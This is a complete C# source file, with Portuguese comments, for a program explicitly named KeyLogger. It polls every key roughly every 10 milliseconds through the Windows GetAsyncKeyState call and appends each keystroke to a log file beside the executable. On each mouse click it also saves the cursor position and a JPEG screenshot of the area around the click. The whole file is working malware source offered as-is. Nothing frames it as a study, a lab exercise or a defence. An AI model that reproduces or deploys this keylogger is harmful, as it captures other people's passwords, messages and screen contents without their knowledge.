// ReSharper disable HeapView.ClosureAllocation
// ReSharper disable HeapView.DelegateAllocation
// ReSharper disable HeapView.ObjectAllocation
// ReSharper disable HeapView.ObjectAllocation.Evident
// ReSharper disable HeapView.ObjectAllocation.Possible
// ReSharper disable ObjectCreationAsStatement
// ReSharper disable HeapView.BoxingAllocation

using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace KeyLogger
{
    /// <summary>
    /// Classe principal.
    /// </summary>
    internal static class Program
    {
        /// <summary>
        /// GetAsyncKeyState determina se uma tecla está pressionada ou não.
        /// </summary>
        /// <param name="vKey">Tecla a ser verificada.</param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        /// <summary>
        /// Obtem a posição do cursor na tela.
        /// </summary>
        /// <param name="lpPoint">Recebe os valores de posicionamento.</param>
        /// <returns>Sucesso de retorno.</returns>
        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out Point lpPoint);

        /// <summary>
        /// Nome do arquivo que armazena o log.
        /// </summary>
        private static readonly string Filename = Assembly.GetExecutingAssembly().Location + ".log";

        /// <summary>
        /// Buffer para gravar no arquivo.
        /// </summary>
        private static string _buffer = string.Empty;

        /// <summary>
        /// Sinaliza escrita do buffer em andamento.
        /// </summary>
        private static bool _bufferWriting;

        /// <summary>
        /// Retângulo para captura da tela.
        /// </summary>
        private static Rectangle _capture = Rectangle.Empty;

        /// <summary>
        /// Ponto de entrada da execução do programa.
        /// </summary>
        private static void Main()
        {
            Console.WriteLine("Press any key to exit.");
            new Timer(state =>
            {
                foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(key) != -32767) continue;
                    var keyName = GetKeyName(key, true);
                    Console.Write(keyName);
                    WriteOnFile(keyName);
                }
            }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
            
            Console.ReadKey(true);
        }

        /// <summary>
        /// Obtem o nome ou descrição de uma tecla.
        /// </summary>
        /// <param name="key">Tecla.</param>
        /// <param name="printScreenIfMouseAction">Captura a tela se for uma ação de mouse.</param>
        /// <returns>Nome ou descrição.</returns>
        private static string GetKeyName(Keys key, bool printScreenIfMouseAction = false)
        {
            // ReSharper disable once SwitchStatementMissingSomeCases
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return Environment.NewLine;
                default:
                {
                    var name = $"{Enum.GetName(typeof(Keys), key)}";
                    
                    if (name.Length == 1) return name.ToLower();

                    // ReSharper disable once InvertIf
                    if (name.Contains("Button"))
                    {
                        GetCursorPos(out var mouse);
                        var printScreen = printScreenIfMouseAction ? PrintScreen(mouse) : string.Empty;
                        return $"[{name} X:{mouse.X} Y:{mouse.Y} {printScreen}]".Trim();
                    }

                    return $"[{name}]";
                }
            }
        }

        /// <summary>
        /// Captura a tela na posição indicada.
        /// </summary>
        /// <param name="center">Posição central.</param>
        /// <param name="radius">Raio da área capturada. Embora seja retangular.</param>
        private static string PrintScreen(Point center, int radius = 200)
        {
            if (!_capture.IsEmpty) return string.Empty;
            
            _capture = new Rectangle(center.X - radius / 2, center.Y - radius / 2, radius, radius);
            var file = new FileInfo($"{Filename}.{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.jpg");

            var worker = new BackgroundWorker();
            worker.DoWork += (sender, args) =>
            {
                try
                {
                    using (var bitmap = new Bitmap(_capture.Width, _capture.Height))
                    {
                        using (var graphics = Graphics.FromImage(bitmap))
                        {
                            graphics.CopyFromScreen(_capture.Location, Point.Empty, _capture.Size);
                        }
                        bitmap.Save(file.FullName, ImageFormat.Jpeg);
                    }
                }
                catch (Exception ex)
                {
                    // Ignora se não conseguir capturar a tela.
                    Console.WriteLine("ERROR: {0}", ex);
                }
                _capture = Rectangle.Empty;
            };
            worker.RunWorkerAsync();

            return file.Name;
        }

        /// <summary>
        /// Escreve o buffer em arquivo.
        /// </summary>
        /// <param name="text">Texto para escrita no arquivo.</param>
        private static void WriteOnFile(string text)
        {
            _buffer += text;

            if (_bufferWriting) return;
            _bufferWriting = true;

            var buffer = _buffer;
            _buffer = string.Empty;

            var worker = new BackgroundWorker();
            worker.DoWork += (sender, args) =>
            {
                try
                {
                    File.AppendAllText(Filename, buffer);
                    _bufferWriting = false;
                }
                catch (Exception ex)
                {
                    // Ignora se não conseguir escrever no arquivo.
                    Console.WriteLine("ERROR: {0}", ex);
                }
            };
            worker.RunWorkerAsync();
        }
    }
}